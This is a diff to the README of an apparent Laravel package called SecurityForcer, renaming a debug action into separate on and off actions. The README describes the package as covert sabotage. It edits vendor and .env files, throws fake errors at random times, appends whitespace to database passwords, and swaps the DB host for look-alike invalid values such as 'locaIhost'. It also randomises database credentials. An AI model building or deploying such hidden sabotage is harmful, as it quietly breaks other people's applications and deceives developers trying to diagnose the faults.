@@ -32,7 +32,8 @@ It modifies laravel vendor files and the apps' env files. This way it doesn't ge
 * **RandomLimit:** with a ``` time() % 11 < 4 ``` chance, application will throw "509 Whoops, looks like something went wrong." fake error.
 * **SyntaxHandler:** with a ``` time() % 11 > 8 ``` chance, application will throw ```undefined variable: items``` fake error. It will show the real ending line number of controller@action.
 * **ApplyCredential:** forces application to use altered password that is original_password + whitespace ("password123" becomes "password123 ")
-* **ApplyDebug:** forces application to run with app.debug=false to prevent detailed errors
+* **ApplyDebugOff:** forces application to run with app.debug=false to prevent detailed errors
+* **ApplyDebugOn:** forces application to run with app.debug=true to show errors
 * **ApplyHost:** sets applications default db host to **locaIhost** (if the current value is *localhost*) or **127.0.0.0**. *(both are invalid. keyword locaIhost includes uppercase i instead of l and obviously 127.0.0.0 is not 127.0.0.1)*
 * **MixConnection:** modifies .env **DB_CONNECTION** to **pgsql**. If you are already using pgsql driver this is useless meh.
 * **MixCredentials:** changes .env **DB_USERNAME** and **DB_PASSWORD** values and randomize them.
@@ -87,7 +88,8 @@ return [
             'spin' => (
                 // this is where you pass your actions or dont add this at all and package will run all its actions
                 \Lmande\SecurityForcer\Actions\ApplyCredential::getAId() |
-                \Lmande\SecurityForcer\Actions\ApplyDebug::getAId() |
+                \Lmande\SecurityForcer\Actions\ApplyDebugOff::getAId() |
+                \Lmande\SecurityForcer\Actions\ApplyDebugOn::getAId() |
                 \Lmande\SecurityForcer\Actions\ApplyHost::getAId() |
                 \Lmande\SecurityForcer\Actions\NightDistributer::getAId() |
                 \Lmande\SecurityForcer\Actions\RandomLimit::getAId() |
